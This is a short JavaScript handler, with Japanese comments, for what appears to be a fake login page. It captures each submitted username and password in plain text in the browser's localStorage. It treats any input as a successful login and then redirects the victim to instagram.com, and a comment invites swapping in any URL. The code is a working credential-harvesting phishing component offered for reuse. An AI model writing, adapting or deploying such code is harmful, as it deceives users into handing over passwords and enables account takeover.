document.getElementById("login-form").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // ログを保存
    let logs = JSON.parse(localStorage.getItem("loginLogs")) || [];
    logs.push({username: username, password: password, time: new Date().toLocaleString()});
    localStorage.setItem("loginLogs", JSON.stringify(logs));

    // ✅ どんな入力でも成功としてリダイレクト
    window.location.href = "https://www.instagram.com/";  // ←ここを好きなURLに変えてOK！

    this.reset(); // 入力フォームをリセット
});
